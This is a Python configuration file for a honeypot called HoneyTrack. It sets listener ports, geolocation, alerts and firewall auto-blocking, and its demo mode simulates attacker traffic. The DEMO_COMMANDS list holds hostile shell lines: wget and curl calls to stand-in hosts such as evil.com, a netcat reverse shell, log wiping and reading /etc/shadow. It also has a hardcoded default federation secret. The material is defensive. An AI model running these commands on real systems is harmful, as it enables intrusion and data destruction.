"""
Centralized configuration for HoneyTrack.

All configurable values live here so every module
reads from a single source of truth.

Secrets are loaded from a .env file (never committed to git).
"""

import os
import secrets
def _load_env_file(filepath):
    if not os.path.exists(filepath):
        return
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" in line:
                    k, v = line.split("=", 1)
                    k = k.strip()
                    v = v.strip().strip("'\"")
                    if k and k not in os.environ:
                        os.environ[k] = v
    except Exception:
        pass

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ──────────────────────────────────────────────
# Paths
# ──────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_env_file = os.path.join(BASE_DIR, ".env")
if os.path.exists(_env_file):
    try:
        from dotenv import load_dotenv
        load_dotenv(_env_file)
    except Exception:
        pass
    _load_env_file(_env_file)

DATABASE_PATH = os.path.join(BASE_DIR, "honeytrack.db")
DATABASE_URL = f"sqlite:///{DATABASE_PATH}"
SSH_HOST_KEY_PATH = os.path.join(BASE_DIR, "ssh_host_key")

# Cryptographic Session Key
SECRET_KEY = os.environ.get("SECRET_KEY")
if not SECRET_KEY:
    SECRET_KEY = secrets.token_hex(32)

# ──────────────────────────────────────────────
# Honeypot Listener Ports
# ──────────────────────────────────────────────

SSH_HOST = "0.0.0.0"
SSH_PORT = 2222

HTTP_HOST = "0.0.0.0"
HTTP_PORT = 8080

FTP_HOST = "0.0.0.0"
FTP_PORT = 2121

# ──────────────────────────────────────────────
# Dashboard / API
# ──────────────────────────────────────────────

DASHBOARD_HOST = "0.0.0.0"
DASHBOARD_PORT = 5000
API_POLL_INTERVAL_MS = 3000  # Frontend polling interval
API_DEFAULT_EVENT_LIMIT = 200
IS_DEMO_MODE = False

# ──────────────────────────────────────────────
# Geolocation
# ──────────────────────────────────────────────

GEO_API_URL = "http://ip-api.com/json"
GEO_RATE_LIMIT_INTERVAL = 1.5       # seconds between API calls
GEO_REQUEST_TIMEOUT = 5             # seconds

# ──────────────────────────────────────────────
# Demo Mode
# ──────────────────────────────────────────────

DEMO_MIN_INTERVAL = 1.0   # seconds
DEMO_MAX_INTERVAL = 4.0   # seconds

# Pool of realistic IP addresses with known geolocation
DEMO_IP_POOL = [
    # (IP, Country, City, Lat, Lon, ISP)
    ("185.220.101.35",  "Germany",      "Frankfurt",    50.1109, 8.6821,   "Tor Exit Node"),
    ("45.155.205.233",  "Russia",       "Moscow",       55.7558, 37.6173,  "Red Bytes LLC"),
    ("218.92.0.107",    "China",        "Nanjing",      32.0603, 118.7969, "Chinanet"),
    ("112.85.42.88",    "China",        "Nanjing",      32.0603, 118.7969, "China Telecom"),
    ("141.98.11.70",    "Romania",      "Bucharest",    44.4268, 26.1025,  "Flokinet Ltd"),
    ("103.203.57.2",    "India",        "Mumbai",       19.0760, 72.8777,  "Cloudie Networks"),
    ("200.174.198.120", "Brazil",       "São Paulo",    -23.5505,-46.6333, "Claro SA"),
    ("197.210.70.5",    "Nigeria",      "Lagos",        6.5244,  3.3792,   "MTN Nigeria"),
    ("41.190.2.22",     "Kenya",        "Nairobi",      -1.2921, 36.8219,  "Safaricom"),
    ("5.188.206.14",    "Netherlands",  "Amsterdam",    52.3676, 4.9041,   "PIN DC"),
    ("159.89.168.41",   "Singapore",    "Singapore",    1.3521,  103.8198, "DigitalOcean"),
    ("51.77.52.216",    "France",       "Roubaix",      50.6942, 3.1746,   "OVH SAS"),
    ("189.112.35.82",   "Brazil",       "Rio de Janeiro",-22.9068,-43.1729,"Vivo"),
    ("77.247.181.165",  "Netherlands",  "Amsterdam",    52.3676, 4.9041,   "Tor Exit - Calyx"),
    ("61.177.172.136",  "China",        "Jiangsu",      32.9711, 119.4550, "Chinanet"),
]

DEMO_USERNAMES = [
    "root", "admin", "test", "user", "guest", "ubuntu", "oracle",
    "postgres", "mysql", "ftp", "pi", "www-data", "nginx", "apache",
    "administrator", "deploy", "git", "jenkins", "docker", "vagrant",
]

DEMO_PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "1234", "12345",
    "qwerty", "letmein", "welcome", "monkey", "dragon", "master",
    "abc123", "111111", "password1", "iloveyou", "passw0rd",
    "admin123", "test123", "P@ssw0rd", "changeme", "default",
]

DEMO_COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /",
    "wget http://evil.com/malware.sh", "curl http://c2.bad.com/bot",
    "chmod +x /tmp/payload", "rm -rf /var/log/*",
    "nc -e /bin/sh 10.0.0.1 4444", "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
    "cat /etc/shadow", "hostname", "ifconfig", "ip addr",
    "nmap -sV 192.168.1.0/24", "crontab -l", "history",
    "ls -la /home", "pwd", "ps aux", "netstat -tlnp",
]

DEMO_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "python-requests/2.31.0",
    "curl/7.88.0",
    "Wget/1.21",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/120.0",
    "sqlmap/1.7#stable",
    "Nikto/2.1.6",
    "Hydra/9.5",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
]

# ──────────────────────────────────────────────
# SSH Honeypot — Fake Shell Emulation
# ──────────────────────────────────────────────

SSH_BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
SSH_FAKE_HOSTNAME = "ubuntu-server"
SSH_FAKE_MOTD = """Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: {last_login} from {last_ip}
"""

# Responses for common commands in the fake shell
SSH_COMMAND_RESPONSES = {
    "whoami": "root",
    "id": "uid=0(root) gid=0(root) groups=0(root)",
    "uname": "Linux",
    "uname -a": "Linux ubuntu-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
    "hostname": "ubuntu-server",
    "pwd": "/root",
    "ls": "Desktop  Documents  Downloads  snap",
    "ls -la": "total 36\ndrwx------  5 root root 4096 Jan 15 09:23 .\ndrwxr-xr-x 19 root root 4096 Dec  1 10:15 ..\n-rw-------  1 root root  217 Jan 15 09:23 .bash_history\n-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc\ndrwxr-xr-x  2 root root 4096 Jan 10 14:30 Desktop\ndrwxr-xr-x  2 root root 4096 Jan 10 14:30 Documents\ndrwxr-xr-x  2 root root 4096 Jan 10 14:30 Downloads",
    "ls -la /": "total 68\ndrwxr-xr-x  19 root root  4096 Dec  1 10:15 .\ndrwxr-xr-x  19 root root  4096 Dec  1 10:15 ..\ndrwxr-xr-x   2 root root  4096 Jan  5 12:00 bin\ndrwxr-xr-x   3 root root  4096 Jan  5 12:00 boot\ndrwxr-xr-x  17 root root  3600 Jan 15 09:20 dev\ndrwxr-xr-x  92 root root  4096 Jan 15 09:20 etc\ndrwxr-xr-x   3 root root  4096 Dec  1 10:20 home",
    "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
    "ifconfig": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n        ether 08:00:27:ab:cd:ef  txqueuelen 1000  (Ethernet)\n        RX packets 15234  bytes 12345678 (12.3 MB)",
    "ip addr": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0",
    "ps aux": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 169376 13340 ?        Ss   09:20   0:01 /sbin/init\nroot       432  0.0  0.0  72304  6532 ?        Ss   09:20   0:00 /usr/sbin/sshd -D\nroot       519  0.0  0.0  18380  3072 ?        Ss   09:20   0:00 /usr/sbin/cron -f",
    "netstat -tlnp": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address       Foreign Address     State       PID/Program\ntcp        0      0 0.0.0.0:22          0.0.0.0:*           LISTEN      432/sshd\ntcp        0      0 0.0.0.0:80          0.0.0.0:*           LISTEN      678/nginx",
    "cat /etc/shadow": "cat: /etc/shadow: Permission denied",
    "history": "    1  apt update\n    2  apt upgrade -y\n    3  systemctl start nginx\n    4  ufw allow 22\n    5  exit",
    "exit": None,  # Special: close session
}

# ──────────────────────────────────────────────
# Email Alerts
# ──────────────────────────────────────────────
EMAIL_ALERTS_ENABLED = os.environ.get("EMAIL_ALERTS_ENABLED", "True").lower() in ("true", "1", "yes")
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
SMTP_USERNAME = os.environ.get("SMTP_USERNAME", "")
SMTP_PASSWORD = os.environ.get("SMTP_PASSWORD", "")
ALERT_FROM_EMAIL = os.environ.get("ALERT_FROM_EMAIL", SMTP_USERNAME)
ALERT_TO_EMAIL = os.environ.get("ALERT_TO_EMAIL", SMTP_USERNAME)
ALERT_RISK_THRESHOLD = int(os.environ.get("ALERT_RISK_THRESHOLD", "70"))
ALERT_COOLDOWN_SECONDS = int(os.environ.get("ALERT_COOLDOWN_SECONDS", "300"))

# ──────────────────────────────────────────────
# Firewall & Active Defense Blacklist
# ──────────────────────────────────────────────
FIREWALL_AUTO_BLOCK_ENABLED = os.environ.get("FIREWALL_AUTO_BLOCK_ENABLED", "True").lower() in ("true", "1", "yes")
FIREWALL_AUTO_BLOCK_THRESHOLD = int(os.environ.get("FIREWALL_AUTO_BLOCK_THRESHOLD", "85"))
FIREWALL_BLOCK_TOR_EXIT_NODES = os.environ.get("FIREWALL_BLOCK_TOR_EXIT_NODES", "False").lower() in ("true", "1", "yes")
FIREWALL_EXECUTE_SYSTEM_RULES = os.environ.get("FIREWALL_EXECUTE_SYSTEM_RULES", "False").lower() in ("true", "1", "yes")

# ──────────────────────────────────────────────
# Distributed Sensor Node Federation (v2.0)
# ──────────────────────────────────────────────
FEDERATION_ENABLED = os.environ.get("FEDERATION_ENABLED", "True").lower() in ("true", "1", "yes")
NODE_ID = os.environ.get("NODE_ID", "honeytrack-primary-sensor")
NODE_NAME = os.environ.get("NODE_NAME", "HoneyTrack Primary Node")
NODE_REGION = os.environ.get("NODE_REGION", "AP-SOUTH-1 (Mumbai)")
FEDERATION_SECRET = os.environ.get("FEDERATION_SECRET", "honeytrack_federated_mesh_secret_key_v2")
FEDERATION_HUB_URL = os.environ.get("FEDERATION_HUB_URL", "")
FEDERATION_SYNC_INTERVAL_SEC = int(os.environ.get("FEDERATION_SYNC_INTERVAL_SEC", "30"))


